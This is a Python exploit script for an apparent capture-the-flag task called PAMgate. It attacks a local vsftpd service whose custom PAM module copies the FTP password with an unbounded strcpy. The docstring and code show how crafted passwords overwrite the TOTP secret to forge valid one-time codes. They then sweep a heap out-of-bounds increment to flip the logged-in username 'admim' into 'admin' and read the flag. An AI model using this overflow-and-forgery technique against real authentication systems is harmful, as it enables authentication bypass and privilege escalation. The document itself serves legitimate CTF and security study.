#!/usr/bin/env python3
"""Task20 (PAMgate) final exploit: OOB heap byte-flip to become "admin".

Runs on the challenge box against the local vsftpd on 127.0.0.1:30029, whose
FTP auth is handled by the custom PAM module ``pam_pamgate.so``. That module
copies the FTP ``PASS`` argument into a 10-byte stack buffer with a
canary-less, unbounded ``strcpy``, giving three independent primitives via
byte offsets in the password: ``[46:62]`` overwrites the TOTP secret *before*
it is checked (so we can forge a valid one-time code for a self-chosen
secret), ``[7:9]`` overwrites a signed 16-bit "journal index" later used,
after a successful OTP check, as an unbounded ``g[idx]++`` heap write
(``g = calloc(256)``), and ``[98:106]`` overwrites the return address (a
provably closed RCE path, see the write-up's dead ends).

The winning approach does not chase RCE. ``admin`` cannot be enrolled
(blocklisted) or logged into (not present in the userstore), but ``admim``
is a legal, unblocked name that differs from it by exactly one incrementable
byte (``'m'`` 0x6d + 1 == 'n' 0x6e). This script enrolls ``admim``, then
sweeps the OOB index ``g[idx]++`` over a 16-byte-aligned window
(``idx & 0xF == 4``, the offset the lifecycle hypothesis predicts the target
byte sits at relative to a calloc'd chunk) looking for the increment to land
on the 5th byte of the live ``PAM_USER`` string in the same forked child's
heap. vsftpd re-reads ``PAM_USER`` via ``pam_get_item()`` immediately after
``pam_authenticate()`` returns, so once the flip lands, the session's chroot
target becomes ``/srv/ftp/admin``. Because heap layout is randomized per
forked child, a hit must be consumed immediately: on each attempt this script
logs in, reads ``stats.txt`` to check whether the flip landed (``user:
admin``), and if so reads ``flag.txt`` right there in the same FTP session
before disconnecting -- a fresh reconnect with the same index is not
guaranteed to reproduce the flip.
"""

import base64
import ftplib
import hashlib
import hmac
import io
import json
import os
import re
import struct
import time

SECRET = b"AAAAAAAAAAAAAAAA"
LO, HI = -0x2000, -0x6C0


def otp():
    d = hmac.new(
        base64.b32decode(SECRET), struct.pack(">Q", int(time.time() // 30)), hashlib.sha1
    ).digest()
    o = d[-1] & 0x0F
    return f"{(int.from_bytes(d[o : o + 4], 'big') & 0x7FFFFFFF) % 1000000:06d}".encode()


def password(idx):
    p = bytearray(b"P" * 62)
    c = otp()
    p[:6] = c
    p[6] = ord("X")
    p[7:9] = struct.pack("<h", idx)
    p[46:62] = SECRET
    if any(x in (0, 10, 13) for x in p[7:9]):
        return None
    return bytes(p).decode("latin-1")


def one(idx):
    pw = password(idx)
    if pw is None:
        return {"idx": idx, "status": "skip-wire-byte"}
    f = ftplib.FTP()
    f.encoding = "latin-1"
    out = {"idx": idx, "idx_hex": struct.pack("<h", idx).hex()}
    try:
        f.connect("127.0.0.1", 30029, timeout=6)
        out["login"] = f.login("admim", pw)
        buf = io.BytesIO()
        f.retrbinary("RETR stats.txt", buf.write)
        data = buf.getvalue().decode("utf-8", "replace")
        out["stats"] = data
        m = re.search(r"^user: (.*)\nlogins: (\d+)\n$", data)
        out["user"] = m.group(1) if m else None
        out["logins"] = int(m.group(2)) if m else None
        out["status"] = "ok"
        if out["user"] == "admin":
            try:
                out["files"] = f.nlst()
            except Exception as exc:
                out["files_error"] = repr(exc)
            try:
                flag = io.BytesIO()
                f.retrbinary("RETR flag.txt", flag.write)
                out["flag"] = flag.getvalue().decode("utf-8", "replace")
            except Exception as exc:
                out["flag_error"] = repr(exc)
    except Exception as exc:
        out["status"] = "error"
        out["error"] = repr(exc)
    finally:
        try:
            f.close()
        except Exception:
            pass
    return out


def main():
    try:
        os.remove("/tmp/username_flip_offset_sweep.jsonl")
    except FileNotFoundError:
        pass
    # Refresh the name if the service restarted; an existing record returns 530
    # and is harmless. This is deliberately not a broad username sweep.
    try:
        f = ftplib.FTP()
        f.encoding = "latin-1"
        f.connect("127.0.0.1", 30029, timeout=6)
        print("ENROLL", f.login("admim", "enroll"), flush=True)
        f.close()
    except Exception as exc:
        print("ENROLL_ERR", repr(exc), flush=True)

    total = 0
    ok = 0
    # The lifecycle hypothesis predicts the target byte is offset 4 from a
    # 16-byte-aligned calloc base. Keep this continuation narrow and aligned.
    indices = [idx for idx in range(LO, HI) if (idx & 0xF) == 4]
    for idx in indices:
        item = one(idx)
        total += 1
        if item.get("status") == "ok":
            ok += 1
        if item.get("user") not in (None, "admim") or "avito{" in item.get("stats", ""):
            print("HIT", json.dumps(item, ensure_ascii=False, sort_keys=True), flush=True)
        if total % 16 == 0:
            print("PROGRESS", total, "ok", ok, "last", idx, flush=True)
    print("SWEEP_DONE", total, "ok", ok, flush=True)


if __name__ == "__main__":
    main()
